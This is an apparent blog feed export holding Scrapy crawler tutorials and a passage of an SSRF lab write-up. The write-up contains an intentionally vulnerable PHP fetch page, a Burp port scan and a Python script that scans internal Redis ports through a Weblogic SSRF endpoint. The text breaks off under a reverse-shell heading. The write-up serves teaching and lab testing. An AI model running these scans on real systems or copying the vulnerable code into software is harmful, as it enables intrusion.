class="language-python"><span class="token keyword">def</span> <span class="token function">sub_article</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>   soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span>soup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.title'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> soup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.toc-text'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span>i<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果如下：</p><pre class="line-numbers language-none"><code class="language-none">~# scrapy crawl blogurl  -s LOG_FILE&#x3D;all.log【漏洞笔记】Robots.txt站点文件         0x00 概述         0x01 漏洞描述         0x02 漏洞危害         0x03 修复建议【经验总结】常见的HTTP方法         0x00 概述         0x01 GET         0x02 HEAD         0x03 POST         0x04 PUT         0x05 DELETE         0x06 CONNECT         0x07 OPTIONS         0x08 TRACE         0x09 PATCH【漏洞笔记】Host头攻击         0x00 概述         0x01 漏洞描述         0x02 漏洞危害         0x03 修复建议【直播笔记】白帽子的成长之路【Python 学习笔记】 异步IO (asyncio) 协程         0x00 前言         0x01 基本用法……省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-完整代码"><a href="#0x02-完整代码" class="headerlink" title="0x02 完整代码"></a>0x02 完整代码</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> scrapy<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">class</span> <span class="token class-name">BlogSpider</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Spider<span class="token punctuation">)</span><span class="token punctuation">:</span>   name <span class="token operator">=</span> <span class="token string">'blogurl'</span>   start_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'https://www.teamssix.com'</span><span class="token punctuation">]</span>   <span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>      soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> soup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.post-title'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         url <span class="token operator">=</span> <span class="token string">'https://www.teamssix.com&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token string">'href'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>         <span class="token keyword">yield</span> scrapy<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>callback<span class="token operator">=</span>self<span class="token punctuation">.</span>sub_article<span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">sub_article</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>      soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>      title <span class="token operator">=</span> self<span class="token punctuation">.</span>article_title<span class="token punctuation">(</span>soup<span class="token punctuation">)</span>      <span class="token builtin">list</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>article_list<span class="token punctuation">(</span>soup<span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>title<span class="token punctuation">)</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">article_title</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>soup<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> soup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.title'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text   <span class="token keyword">def</span> <span class="token function">article_list</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>soup<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> soup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.toc-text'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token builtin">list</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">.</span>text<span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token builtin">list</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考链接：<br><a href="https://youtu.be/aDwAmj3VWH4">https://youtu.be/aDwAmj3VWH4</a><br><a href="https://blog.csdn.net/DEREK_D/article/details/84239813">https://blog.csdn.net/DEREK_D/article/details/84239813</a><br><a href="http://doc.scrapy.org/en/latest/topics/architecture.html">http://doc.scrapy.org/en/latest/topics/architecture.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Python </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python Scrapy 爬虫框架】 2、利用 Scrapy 爬取我的博客文章标题链接</title>
      <link href="//191224-093319.html"/>
      <url>//191224-093319.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-新建项目"><a href="#0x00-新建项目" class="headerlink" title="0x00 新建项目"></a>0x00 新建项目</h1><p>在终端中即可直接新建项目，这里我创建一个名称为 teamssix 的项目，命令如下：</p><pre class="line-numbers language-none"><code class="language-none">scrapy startproject teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>命令运行后，会自动在当前目录下生成许多文件，如下所示：</p><pre class="line-numbers language-none"><code class="language-none">teamssix    │  scrapy.cfg  #scrapy的配置文件    └─teamssix  #项目的Python模块，在这里写自己的代码        │  items.py  #项目定义文件        │  middlewares.py  #项目中间件文件        │  pipelines.py  #项目管道文件，用来处理数据的写入存储等操作        │  settings.py  #项目设置文件        │  __init__.py        ├─spiders  #在这里写爬虫代码        └─ __init__.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><a id="more"></a><p>接下来使用 Pycharm 打开我们刚才新建的项目。</p><h1 id="0x01-创建一个爬虫"><a href="#0x01-创建一个爬虫" class="headerlink" title="0x01 创建一个爬虫"></a>0x01 创建一个爬虫</h1><p>首先，在 spiders 文件下 new 一个 python file，这里我新建了一个名为 teamssix_blog_spider 的 py 文件。</p><p>在新建的文件中写入自己的代码，这里我写的代码如下：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import scrapyclass BlogSpider(scrapy.Spider):  #创建 Spider 类   name &#x3D; &#39;blogurl&#39;，  #爬虫名称，必填   start_urls &#x3D; [&#39;https:&#x2F;&#x2F;www.teamssix.com&#39;]  #待爬取的 url ，必填   def parse(self,response):  #定义 parse 函数，以解析爬到的东西      print(response.url)      print(response.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-运行爬虫"><a href="#0x02-运行爬虫" class="headerlink" title="0x02 运行爬虫"></a>0x02 运行爬虫</h1><p>之后运行我们刚新建的 blogurl 项目，运行命令如下：</p><pre class="line-numbers language-none"><code class="language-none">scrapy crawl blogurl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后输出结果如下：</p><pre class="line-numbers language-none"><code class="language-none">2019-12-23 18:33:45 [scrapy.utils.log] INFO: Scrapy 1.8.0 started (bot: teamssix)2019-12-23 18:33:45 [scrapy.utils.log] INFO: Versions: lxml 4.2.5.0, libxml2 2.9.8, cssselect 1.1.0, parsel 1.5.2, w3lib 1.21.0, Twisted 19.10.0, Python 3.7e&#39;……省略……https:&#x2F;&#x2F;www.teamssix.com&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;&lt;head&gt;&lt;meta name&#x3D;&quot;generator&quot; content&#x3D;&quot;Hexo 3.8.0&quot;&gt;&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;&lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;&lt;meta name&#x3D;&quot;vi                                      tent&gt;&lt;meta name&#x3D;&quot;keywords&quot; content&gt;&lt;meta name&#x3D;&quot;author&quot; content&#x3D;&quot;Teams Six,undefined&quot;&gt;&lt;meta name&#x3D;&quot;copyright&quot; content&#x3D;&quot;Teams Six&quot;&gt;&lt;title&gt;【Teams Six】&lt;&#x2F;title&gt;&lt;link rel&#x3D;&quot;styles                                      css&quot;&gt;&lt;link rel&#x3D;&quot;icon&quot; href&#x3D;&quot;&#x2F;favicon.ico&quot;&gt;&lt;!-- script(src&#x3D;&quot;http:&#x2F;&#x2F;cdn.mathjax.org&#x2F;mathjax&#x2F;latest&#x2F;MathJax.js?config&#x3D;TeX-AMS-MML_HTMLorMML&quot;)--&gt;&lt;script src&#x3D;&quot;&#x2F;js&#x2F;mathjax&#x2F;mathjax    tex2jax: &#123;inlineMath: [[&#39;$&#39;, &#39;$&#39;], [&#39;\\(&#39;, &#39;\\)&#39;]]&#125;&#125;);……省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不难看出，我们想要的内容已经被打印出来了，但这还远远不够，我们还需要对其进行简单的解析，这里就用到了 BeautifulSoup ，有过爬虫经验的对这个库应该是不陌生了。</p><h1 id="0x03-爬取内容解析"><a href="#0x03-爬取内容解析" class="headerlink" title="0x03 爬取内容解析"></a>0x03 爬取内容解析</h1><p>接下来，想要获取到每个文章的链接，只需要对 parse 的内容进行修改，修改也很简单，基本之前写的多线程里的代码一致。</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">def parse(self,response):   soup &#x3D; BeautifulSoup(response.text,&#39;html.parser&#39;)   for i in soup.select(&#39;.post-title&#39;):      print(&#39;https:&#x2F;&#x2F;www.teamssix.com&#123;&#125;&#39;.format(i[&#39;href&#39;]))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>很简单的一个小爬虫，然后将爬虫运行一下</p><pre class="line-numbers language-none"><code class="language-none">~# scrapy crawl blogurl  #运行命令2019-12-23 19:02:01 [scrapy.utils.log] INFO: Scrapy 1.8.0 started (bot: teamssix)……省略……https:&#x2F;&#x2F;www.teamssix.com&#x2F;year&#x2F;191222-192227.htmlhttps:&#x2F;&#x2F;www.teamssix.com&#x2F;year&#x2F;191220-161745.html……省略……2019-12-23 19:02:04 [scrapy.core.engine] INFO: Spider closed (finished)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时就能够将我们想要的东西爬下来了，但这实现的功能还是比较简单，接下来将介绍如何使用 Scrapy 爬取每个子页面中的详细信息。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix<br>原文链接：<a href="https://www.temassix.com/year/191224-093319.html">https://www.temassix.com/year/191224-093319.html</a></p></blockquote><blockquote><p>参考链接：<br><a href="https://youtu.be/aDwAmj3VWH4">https://youtu.be/aDwAmj3VWH4</a><br><a href="http://doc.scrapy.org/en/latest/intro/tutorial.html">http://doc.scrapy.org/en/latest/intro/tutorial.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Python </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python Scrapy 爬虫框架】 1、简介与安装</title>
      <link href="//191224-092208.html"/>
      <url>//191224-092208.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>下图展示了 Scrapy 的体系结构及其组件概述，在介绍图中的流程前，先来简单了解一下图中每个组件的含义。</p><h3 id="Engine"><a href="#Engine" class="headerlink" title="Engine"></a>Engine</h3><p>Engine 负责控制系统所有组件之间的数据流，并在某些操作发生时触发事件。</p><a id="more"></a><h3 id="Scheduler"><a href="#Scheduler" class="headerlink" title="Scheduler"></a>Scheduler</h3><p>Scheduler 接收来自 Engine 的请求，并对请求进行排队，以便稍后在 Engine 请求时提供这些请求。</p><h3 id="Downloader"><a href="#Downloader" class="headerlink" title="Downloader"></a>Downloader</h3><p>Downloader 负责获取 web 页面内容并将其提供给 Engine，Engine 再将其提供给 Spiders。</p><h3 id="Spiders"><a href="#Spiders" class="headerlink" title="Spiders"></a>Spiders</h3><p>Spiders 是由 Scrapy 用户编写的自定义类，用于解析响应并从响应中提取所需要的内容。</p><h3 id="Item-Pipelines"><a href="#Item-Pipelines" class="headerlink" title="Item Pipelines"></a>Item Pipelines</h3><p>Item Pipelines 负责处理由 Spiders 提取的数据。典型的任务包括清理、验证和持久性(比如把数据存储在数据库中)。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/scrapy11.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>1、Engine 从 Spiders 获取要爬行的初始请求。</p><p>2、Engine 在 Scheduler 中调度请求并请求爬行下一个请求。</p><p>3、Scheduler  将下一个请求返回给 Engine。</p><p>4、Engine 将请求发送给 Downloader，Downloader 对待请求网站进行访问。</p><p>5、Downloader 获取到响应后，将响应数据发送到 Engine。</p><p>6、Engine 接收来自 Downloader 的响应并将其发送到 Spiders 进行解析处理。</p><p>7、Spiders 处理响应后将解析到的数据发送给 Engine。</p><p>8、Engine 将处理过的数据发送到 Item Pipelines，然后将处理过的请求发送到 Scheduler，并请求爬行可能的下一个请求，该过程重复(从步骤1开始)，直到 Scheduler 不再发出请求为止。</p><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><p>在安装 Scrapy 之前，建议先安装 Anaconda ，可以省去不少麻烦，Scrapy可以直接 pip 安装，值得注意的是，如果使用 Python2 开发，就需要使用 pip2 安装，使用 Python3 开发就需要使用 pip3 安装，安装命令如下：</p><pre class="line-numbers language-none"><code class="language-none">pip install scrapy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果安装比较慢，可以指定国内安装源进行安装，下面的命令使用的清华源。</p><pre class="line-numbers language-none"><code class="language-none">pip install scrapy -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 -i 指定国内安装源后可以有效的提高下载速度。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考链接：<br><a href="https://youtu.be/aDwAmj3VWH4">https://youtu.be/aDwAmj3VWH4</a><br><a href="http://doc.scrapy.org/en/latest/topics/architecture.html">http://doc.scrapy.org/en/latest/topics/architecture.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Python </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞笔记】浅谈SSRF原理及其利用</title>
      <link href="//191222-192227.html"/>
      <url>//191222-192227.html</url>
      
        <content type="html"><![CDATA[<p>声明：本文仅用作技术交流学习分享用途，严禁将本文中涉及到的技术用法用于违法犯罪目的。</p><h1 id="0x00-漏洞说明"><a href="#0x00-漏洞说明" class="headerlink" title="0x00 漏洞说明"></a>0x00 漏洞说明</h1><p>SSRF (Server-Side Request Forgery) 即服务端请求伪造，从字面意思上理解就是伪造一个服务端请求，也即是说攻击者伪造服务端的请求发起攻击，攻击者借由服务端为跳板来攻击目标系统，既然是跳板，也就是表明攻击者是无法直接访问目标服务的，为了更好的理解这个过程，我从网上找了一张图，贴在了下面。</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h1><p>上面简单介绍了一下SSRF的原理，那么SSRF能干什么，产生哪些危害呢？</p><p>利用SSRF可以进行内外网的端口和服务探测、主机本地敏感数据的读取、内外网主机应用程序漏洞的利用等等，可以说SSRF的危害不容小觑了。</p><h1 id="0x02-漏洞发现"><a href="#0x02-漏洞发现" class="headerlink" title="0x02 漏洞发现"></a>0x02 漏洞发现</h1><p>既然SSRF有这些危害，那我们要怎么发现哪里存在SSRF，发现了又怎么利用呢？接下来就好好唠唠这点。</p><p>可以这么说，能够对外发起网络请求的地方，就可能存在SSRF漏洞，下面的内容引用了先知社区的一篇文章，文章链接在底部。</p><p>具体可能出现SSRF的地方：</p><p>1.社交分享功能：获取超链接的标题等内容进行显示</p><p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p><p>3.在线翻译：给网址翻译对应网页的内容</p><p>4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p><p>5.图片/文章收藏功能：主要网站会取URL地址中title以及文本的内容作为显示以求一个好的用户体验</p><p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行SSRF测试</p><p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p><p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p><p>9.邮件系统：比如接收邮件服务器地址</p><p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p><p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞，一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p><p>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p><h1 id="0x03-漏洞验证"><a href="#0x03-漏洞验证" class="headerlink" title="0x03 漏洞验证"></a>0x03 漏洞验证</h1><p>1、因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们可以通过抓包分析发送的请求是否是由服务器端发送的来判断是否存在SSRF漏洞</p><p>2、在页面源码中查找访问的资源地址，如果该资源地址类型为下面这种样式则可能存在SSRF漏洞</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.xxx.com&#x2F;a.php?image&#x3D;(地址)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h1><h2 id="1、一个简单的测试靶场"><a href="#1、一个简单的测试靶场" class="headerlink" title="1、一个简单的测试靶场"></a>1、一个简单的测试靶场</h2><p>测试PHP代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用phpstudy或者宝塔搭建好靶场后，访问自己的url地址。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.38.132&#x2F;ssrf.php?url&#x3D;teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>如果服务器有其他服务只能本地访问，比如phpmyadmin，则可以构造ssrf.php?url=127.0.0.1、phpmyadmin进行访问，接下来看看利用SSRF扫描目标主机端口</p><p>打开Burp，抓包发到Intruder，设置Payload位置</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>将载荷类型设置为number，数字范围从1-65535，开始爆破</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>根据响应长度及响应码，可以判断出80、3389是开放着的</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、Weblogic漏洞复现"><a href="#2、Weblogic漏洞复现" class="headerlink" title="2、Weblogic漏洞复现"></a>2、Weblogic漏洞复现</h2><p>搭建环境参考：<a href="https://blog.csdn.net/qq_36374896/article/details/84102101">https://blog.csdn.net/qq_36374896/article/details/84102101</a></p><p>搭建好之后，访问 IP:7001/uddiexplorer/ 即可访问，如果搭建在本机， IP 就是127.0.0.1。</p><h3 id="1、漏洞存在测试"><a href="#1、漏洞存在测试" class="headerlink" title="1、漏洞存在测试"></a>1、漏洞存在测试</h3><p>Weblogic 的 SSRF 漏洞地址在 /uddiexplorer/SearchPublicRegistries.jsp ，开启Burp代理后，来到漏洞地址，随便在搜索框里输点东西，点击 search 按钮抓包</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到在请求包里的 operator 参数值为URL，说明此处可能存在SSRF漏洞</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>将 operator 参数值为改为其他URL，再次进行发包测试</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>把响应包翻到底部，可以很明显的看到靶机对我们修改后的URL进行了访问，接下来把URL端口修改一下，也就是让靶机请求一个不存在的地址</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF9.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>这时靶机返回信息提示连接不到服务，通过上面的两步测试可以判断出该目标是存在SSRF漏洞的。</p><h3 id="2、通过Redis服务反弹shell"><a href="#2、通过Redis服务反弹shell" class="headerlink" title="2、通过Redis服务反弹shell"></a>2、通过Redis服务反弹shell</h3><p>既然想通过Redis服务反弹Shell，就需要先知道Redis服务的内网IP，这里因为是本地环境，内网IP就直接查看了，如果公网的话就要看前期信息收集怎么样了，当然爆破IP也是可以的。</p><p>进入 redis服务 的shell，查看内网IP</p><pre class="line-numbers language-none"><code class="language-none">:~&#x2F;vulhub&#x2F;weblogic&#x2F;ssrf# docker exec -it ssrf_redis_1 bash[root@5d9f91f455b6 &#x2F;]# ifconfigeth0      Link encap:Ethernet  HWaddr 02:42:AC:12:00:02            inet addr:172.18.0.2  Bcast:172.18.255.255  Mask:255.255.0.0          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:129 errors:0 dropped:0 overruns:0 frame:0          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:13176 (12.8 KiB)  TX bytes:0 (0.0 b)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>知道内网IP后，就能扫描端口了，下面是我写的一个小脚本，当然用Burp也是可以的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://192.168.38.134:7001/uddiexplorer/SearchPublicRegistries.jsp?'</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span><span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> port <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">65535</span><span class="token punctuation">)</span><span class="token punctuation">:</span>data <span class="token operator">=</span> <span class="token string">'operator=http://172.18.0.2:&#123;&#125;&amp;rdoSearch=name&amp;txtSearchname=teamsix&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">'Tried all'</span> <span class="token keyword">not</span> <span class="token 